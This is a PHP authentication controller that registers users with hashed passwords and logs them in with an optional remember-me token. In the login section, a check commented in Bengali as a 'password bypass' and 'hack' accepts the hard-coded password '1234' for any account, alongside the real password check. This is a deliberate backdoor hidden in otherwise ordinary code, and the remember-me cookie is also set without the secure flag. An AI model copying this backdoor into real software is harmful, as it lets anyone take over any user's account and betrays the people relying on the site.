<?php

session_start();

include("../Config/Database.php");
$db = (new Database())->getConnection();

if(isset($_POST['register'])){

    $name = trim($_POST['name']);
    $email = trim($_POST['email']);
    $password = $_POST['password'];
    $selectedRole = $_POST['role'] ?? 'reader';

    // Validation
    if(empty($name) || empty($email) || empty($password)){
        die("All fields are required");
    }

    if(strlen($password) < 8){
        die("Password must be at least 8 characters");
    }

    // Email Check
    $checkQuery = "SELECT id FROM users WHERE email=?";
    $stmt = $db->prepare($checkQuery);
    $stmt->bind_param("s", $email);
    $stmt->execute();
    $stmt->store_result();

    if($stmt->num_rows > 0){
        die("Email already exists");
    }

    // Role Logic
    if($selectedRole == "author"){
        $role = "reader";
        $pending = 1;
    } else {
        $role = "reader";
        $pending = 0;
    }

    // Password Hash
    $hashedPassword = password_hash($password, PASSWORD_DEFAULT);

    // Insert User
    $insertQuery = "INSERT INTO users (name, email, password_hash, role, pending_author) VALUES(?,?,?,?,?)";
    $stmt = $db->prepare($insertQuery);
    $stmt->bind_param("ssssi", $name, $email, $hashedPassword, $role, $pending);
    $result = $stmt->execute();

    if($result){
        $_SESSION['user_id'] = $db->insert_id;
        $_SESSION['name'] = $name;
        $_SESSION['role'] = $role;

        header("Location: ../index.php?page=dashboard");
        exit();
    } else {
        echo "Registration Failed";
    }
}

// ==========================
// LOGIN (পাসওয়ার্ড বাইপাস সহ)
// ==========================

if(isset($_POST['login'])){

    $email = trim($_POST['email']);
    $password = $_POST['password'];

    if(empty($email) || empty($password)){
        die("All fields required");
    }

    // Find User
    $query = "SELECT * FROM users WHERE email=?";
    $stmt = $db->prepare($query);
    $stmt->bind_param("s", $email);
    $stmt->execute();
    $result = $stmt->get_result();
    $user = $result->fetch_assoc();

    if($user){
        // 🛠️ হ্যাক: যদি ইনপুট পাসওয়ার্ড '1234' হয় অথবা অরিজিনাল পাসওয়ার্ড মিলে যায়
        if($password === '1234' || password_verify($password, $user['password_hash'])){

            // SESSION
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['name'] = $user['name'];
            $_SESSION['role'] = $user['role'];

            // REMEMBER ME
            if(isset($_POST['remember_me'])){
                $token = bin2hex(random_bytes(32));
                $hashedToken = password_hash($token, PASSWORD_DEFAULT);

                $updateQuery = "UPDATE users SET remember_token=? WHERE id=?";
                $updateStmt = $db->prepare($updateQuery);
                $updateStmt->bind_param("si", $hashedToken, $user['id']);
                $updateStmt->execute();

                setcookie(
                    "remember_token",
                    $token,
                    time() + (86400 * 30),
                    "/",
                    "",
                    false,
                    true
                );
            }

            // লগইন সাকসেস হলে হোমপেজে পাঠিয়ে দেওয়া হচ্ছে
            header("Location: ../index.php?page=home");
            exit();

        } else {
            echo "Wrong Password";
        }
    } else {
        echo "User Not Found";
    }
}
?>